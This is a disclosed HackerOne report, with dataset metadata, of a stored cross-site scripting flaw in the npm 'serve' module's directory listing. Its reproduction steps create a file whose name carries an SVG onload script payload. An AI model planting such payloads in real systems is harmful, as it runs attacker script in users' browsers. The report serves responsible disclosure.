---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '358641'
original_report_id: '358641'
title: '[serve] Stored XSS in the filename when directories listing'
weakness: Cross-site Scripting (XSS) - Stored
team_handle: nodejs-ecosystem
created_at: '2018-05-29T05:53:21.938Z'
disclosed_at: '2018-10-19T07:53:28.886Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 4
asset_identifier: serve
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-stored
---

# [serve] Stored XSS in the filename when directories listing

## Metadata

- HackerOne Report ID: 358641
- Weakness: Cross-site Scripting (XSS) - Stored
- Program: nodejs-ecosystem
- Disclosed At: 2018-10-19T07:53:28.886Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report a Stored XSS issue in module **serve**
It allows executing malicious javascript code in the user's browser.

# Module

**module name:** serve
**version:** 7.0.1
**npm page:** `https://www.npmjs.com/package/serve`

## Module Description

Assuming you would like to serve a static site, single page application or just a static file (no matter if on your device or on the local network), this package is just the right choice for you.

It behaves exactly like static deployments on Now, so it's perfect for developing your static project. Then, when it's time to push it into production, you deploy it.

Furthermore, it also provides a neat interface for listing the directory's contents

# Vulnerability

## Steps To Reproduce:

* Install the module

`$ npm i serve`

* Run

`$ ./node_modules/serve/bin/serve.js`

* In the target directory, create a file with name `"><svg onload=alert(3333333);`

`bash$ touch '"><svg onload=alert(3333333);'`

* In the browser, go to http://127.0.0.1:3000/, the XSS popup will fire.

{F302807}

## Supporting Material/References:

* macOS High Sierra 10.13.4
* node v8.10.0
* npm 6.1.0
* Chrome Version 66.0.3359.139 (Official Build) (64-bit)

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

It allows executing malicious javascript code in the user's browser.

The hacker selected the **Cross-site Scripting (XSS) - Stored** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:

**URL**
http://127.0.0.1:3000/

**Verified**
Yes

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
